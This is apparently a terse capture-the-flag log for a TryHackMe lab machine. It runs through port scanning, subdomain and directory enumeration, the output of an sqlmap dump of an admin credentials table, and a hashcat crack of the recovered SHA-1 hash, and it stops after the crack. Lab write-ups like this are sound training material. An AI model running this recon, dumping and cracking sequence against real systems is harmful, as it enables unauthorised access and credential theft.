# CyberCrafted

Port scan: 

``` bash
# port discovery
nmap -sT -p- 10.10.86.126
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-28 19:26 CEST
Nmap scan report for 10.10.86.126 (10.10.86.126)
Host is up (0.046s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
25565/tcp open  minecraft

Nmap done: 1 IP address (1 host up) scanned in 3528.29 seconds

# vuln scan




# sub domain enum
ffuf -w /usr/share/wordlists/amass/subdomains-10000.txt -u "http://cybercrafted.thm" -H "Host: FUZZ.cybercrafted.thm" | grep -v 302

        /'___\  /'___\           /'___\'       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://cybercrafted.thm
 :: Wordlist         : FUZZ: /usr/share/wordlists/amass/subdomains-10000.txt
 :: Header           : Host: FUZZ.cybercrafted.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

admin                   [Status: 200, Size: 937, Words: 218, Lines: 31, Duration: 74ms]
www                     [Status: 200, Size: 832, Words: 236, Lines: 35, Duration: 73ms]
store                   [Status: 403, Size: 287, Words: 20, Lines: 10, Duration: 103ms]
:: Progress: [9985/9985] :: Job [1/1] :: 593 req/sec :: Duration: [0:00:18] :: Errors: 0 ::

# dir enum
gobuster dir -u http://admin.cybercrafted.thm -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://admin.cybercrafted.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 287]
/.htaccess            (Status: 403) [Size: 287]
/.htpasswd            (Status: 403) [Size: 287]
/assets               (Status: 301) [Size: 333] [--> http://admin.cybercrafted.thm/assets/]
/index.php            (Status: 200) [Size: 937]
/server-status        (Status: 403) [Size: 287]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================


gobuster dir -u http://www.cybercrafted.thm -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://www.cybercrafted.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 285]
/.htaccess            (Status: 403) [Size: 285]
/.htpasswd            (Status: 403) [Size: 285]
/assets               (Status: 301) [Size: 329] [--> http://www.cybercrafted.thm/assets/]
/index.html           (Status: 200) [Size: 832]
/secret               (Status: 301) [Size: 329] [--> http://www.cybercrafted.thm/secret/]
/server-status        (Status: 403) [Size: 285]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================

gobuster dir -u http://store.cybercrafted.thm -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://store.cybercrafted.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 287]
/.htpasswd            (Status: 403) [Size: 287]
/.htaccess            (Status: 403) [Size: 287]
/assets               (Status: 301) [Size: 333] [--> http://store.cybercrafted.thm/assets/]
/index.html           (Status: 403) [Size: 287]
/server-status        (Status: 403) [Size: 287]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```




[23:00:19] [INFO] recognized possible password hashes in column '`hash`'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] 

do you want to crack them via a dictionary-based attack? [Y/n/q] 

[23:00:24] [INFO] using hash method 'sha1_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 

[23:00:25] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] 

[23:00:28] [INFO] starting dictionary-based cracking (sha1_generic_passwd)
[23:00:28] [INFO] starting 4 processes 
[23:00:31] [WARNING] no clear password(s) found                                                                                                                                                          
Database: webapp
Table: admin
[2 entries]
+----+------------------------------------------+---------------------+
| id | hash                                     | user                |
+----+------------------------------------------+---------------------+
| 1  | 88b949dd5cdfbecb9f2ecbbfa24e5974234e7c01 | xXUltimateCreeperXx |
| 4  | THM{bbe315906038c3a62d9b195001f75008}    | web_flag            |
+----+------------------------------------------+---------------------+

[23:00:31] [INFO] table 'webapp.`admin`' dumped to CSV file '/home/sheliak/.local/share/sqlmap/output/store.cybercrafted.thm/dump/webapp/admin.csv'
[23:00:31] [INFO] fetched data logged to text files under '/home/sheliak/.local/share/sqlmap/output/store.cybercrafted.thm'

[*] ending @ 23:00:31 /2024-08-28/

                                                                                                                                                                                                          
┌──(sheliak㉿kalipt)-[~/CTF/THM]
└─$ nc 10.10.70.235 25565               
^C
                                                                                                                                                                                                          
┌──(sheliak㉿kalipt)-[~/CTF/THM]
└─$ hashid 88b949dd5cdfbecb9f2ecbbfa24e5974234e7c01                         
Analyzing '88b949dd5cdfbecb9f2ecbbfa24e5974234e7c01'
[+] SHA-1 
[+] Double SHA-1 
[+] RIPEMD-160 
[+] Haval-160 
[+] Tiger-160 
[+] HAS-160 
[+] LinkedIn 
[+] Skein-256(160) 
[+] Skein-512(160) 
                                                                                                                                                                                                          
┌──(sheliak㉿kalipt)-[~/CTF/THM]
└─$ echo "88b949dd5cdfbecb9f2ecbbfa24e5974234e7c01" > hash.txt
                                                                                                                                                                                                          
┌──(sheliak㉿kalipt)-[~/CTF/THM]
└─$ cat hash.txt                  
88b949dd5cdfbecb9f2ecbbfa24e5974234e7c01
                                                                                                                                                                                                          
┌──(sheliak㉿kalipt)-[~/CTF/THM]
└─$ hashcat -m 100 ./hash.txt /usr/share/wordlists/rockyou.txt         
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, POCL_DEBUG) - Platform #1 [The pocl project]
==========================================================================================================================================
* Device #1: cpu--0x000, 1437/2939 MB (512 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

88b949dd5cdfbecb9f2ecbbfa24e5974234e7c01:diamond123456789 
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 100 (SHA1)
Hash.Target......: 88b949dd5cdfbecb9f2ecbbfa24e5974234e7c01
Time.Started.....: Wed Aug 28 23:07:56 2024 (2 secs)
Time.Estimated...: Wed Aug 28 23:07:58 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  7148.7 kH/s (0.05ms) @ Accel:256 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 8638464/14344385 (60.22%)
Rejected.........: 0/8638464 (0.00%)
Restore.Point....: 8637440/14344385 (60.21%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: diamondhouse436 -> diamada
Hardware.Mon.#1..: Util: 41%

Started: Wed Aug 28 23:07:49 2024
Stopped: Wed Aug 28 23:07:59 2024